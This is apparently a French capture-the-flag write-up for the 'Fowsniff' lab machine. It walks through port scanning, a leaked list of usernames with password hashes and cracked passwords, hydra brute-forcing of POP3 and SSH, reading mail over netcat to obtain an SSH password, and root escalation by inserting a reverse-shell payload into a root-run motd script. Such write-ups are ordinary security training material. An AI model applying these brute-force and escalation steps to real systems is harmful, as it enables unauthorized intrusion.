# enum
```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Fowsniff Corp - Delivering Solutions
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: CAPA UIDL PIPELINING SASL(PLAIN) AUTH-RESP-CODE USER TOP RESP-CODES
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: IDLE ENABLE listed AUTH=PLAINA0001 LITERAL+ more have IMAP4rev1 OK ID capabilities LOGIN-REFERRALS post-login SASL-IR Pre-login
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Resultat de recherche google sur fowsniff corp
```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4    : mailcall
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56 : bilbo101
tegel@fowsniff:1dc352435fecca338acfd4be10984009    : apples01
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb : skyler22
seina@fowsniff:90dc16d47114aa13671c697fd506cf26    : scoobydoo2
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b  : carp4ever
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11   : orlando12
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e   : 07011972
```

```bash
awk -F'@' '{print $1}' creds > users
awk -F': ' '{print $2}' creds > pass 
```

```bash
hydra -L users -P pass -f 10.10.103.40 pop3 -V
```
	login: seina   password: scoobydoo2

```
nc 10.10.103.40 110   
```
	+OK Welcome to the Fowsniff Corporate Mail Server!
	user seina
	+OK
	pass scoobydoo2
	+OK Logged in
	list
	+OK 2 messages:
	1 1622
	2 1280
	.
	retr 1
	[***]
	The temporary password for SSH is "S1ck3nBluff+secureshell"
	[***]

```bash
hydra -L users -p S1ck3nBluff+secureshell -f 10.10.103.40 ssh -V
```
	login: baksteen   password: S1ck3nBluff+secureshell
```bash
ssh baksteen@10.10.103.40
```
# privesc
Recherche de fichier appartenant aux différents utilisateurs
```
find / -user parede -exec ls -ld {} \; 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
```
	-rw-rwxr-- 1 parede users 851 Mar 11  2018 /opt/cube/cube.sh
L'utilisateur actuel appartient aux groupe users donc on peut ajouter un revshell dans le fichier
Je recherche un script qui exécute `cub.sh` avec les droit d'un autres utilisateur.
J'ai d'abord utiliser pspy et fouiller le cronjob sans succès. 
Donc je chercher des fichiers contenant `/opt/cube/cube.sh`
```
grep -r /opt/cube/cube.sh / 2>/dev/null
```
	/home/baksteen/.viminfo:> /opt/cube/cube.sh
	/etc/update-motd.d/00-header:sh /opt/cube/cube.sh

Le repertoire `/etc/update-motd.d` contient les scripts qui permettent d'afficher un message de bienvenue lors d'une connexion ssh. Et cela est toujours exécuter automatiquement par l'administrateur *root*.

Donc j'insert mon payload dans *cube.sh*, je me met en écoute sur ma machine et je me reconnecte par ssh à la cible.
Et voilà,  i'm root.
